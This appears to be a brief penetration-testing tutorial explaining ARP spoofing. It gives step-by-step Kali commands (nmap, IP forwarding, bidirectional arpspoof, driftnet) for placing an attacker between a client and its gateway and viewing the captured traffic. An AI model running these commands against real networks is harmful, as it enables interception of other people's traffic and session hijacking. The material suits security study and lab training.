  md: '# ARP Spoofing and MITM (Man In The Middle Attack)


    ![](img/c6b688dca6570d17db3036b560ef0905_76_0.png)


    ARP spoofing is a technique whereby an attacker sends fake ("spoofed") Address
    Resolution Protocol (ARP) messages onto a Local Area Network. Generally, the aim
    is to associate the attacker''s MAC address with the IP address of another host
    (such as the default gateway), causing traffic meant for that IP address to be
    sent to the attacker instead.


    ARP spoofing may allow an attacker to intercept data frames on a LAN, modify the
    traffic, or stop the traffic altogether. The often attack used is an opening for
    other attacks, such as denial of service, man in the middle, or session hijacking
    attacks.


    +   * With the steps below Kali will be between 10.0.0.2 (client) and 10.0.0.1
    (firewall/router/switch)

    * nmap -F 10.0.0.0/24 -- To find the devices on the network and their MAC addresses
    and details

    * echo 1 >/proc/sys/net/ipv4/ip_forward -- enable IP forwarding

    * arpspoof -i eth0 -t 10.0.0.2 10.0.0.1 -- This tells to 10.0.0.2 that Kali is
    10.0.0.1

    * arpspoof -i eth0 -t 10.0.0.1 10.0.0.2 -- This tells to 10.0.0.1 that Kali is
    10.0.0.2

    * With the above commands running and you can verify this on the firewall/gateway

    * Now we can start watching the traffic using sniffer or below

    * driftnet -i eth0 -- This will open a window and show the content of the websites
